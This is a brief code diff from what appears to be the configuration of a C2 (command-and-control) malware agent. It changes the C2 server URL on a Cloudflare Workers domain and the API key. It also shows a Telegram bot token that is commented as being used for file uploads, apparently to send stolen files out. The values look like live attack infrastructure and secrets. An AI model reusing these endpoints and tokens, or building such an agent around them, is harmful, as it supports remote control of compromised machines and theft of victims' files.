@@ -36,10 +36,10 @@ except ImportError:
 # =============================================================================
 
 # C2 Server URL
-C2_SERVER = "https://c2-api.c2agent.workers.dev"
+C2_SERVER = "https://c2master.gudg.workers.dev"
 
 # API Key (must match wrangler.jsonc)
-API_KEY = "VlB9zNP8Wv80gmH40VYRHaZDU4nU26vM"
+API_KEY = "fuckfuckfuckfuck"
 
 # Telegram for file uploads
 TELEGRAM_BOT_TOKEN = "8565861523:AAGGNFPQYuy-0opeCmqOAP5zP9VvqQEo96A"
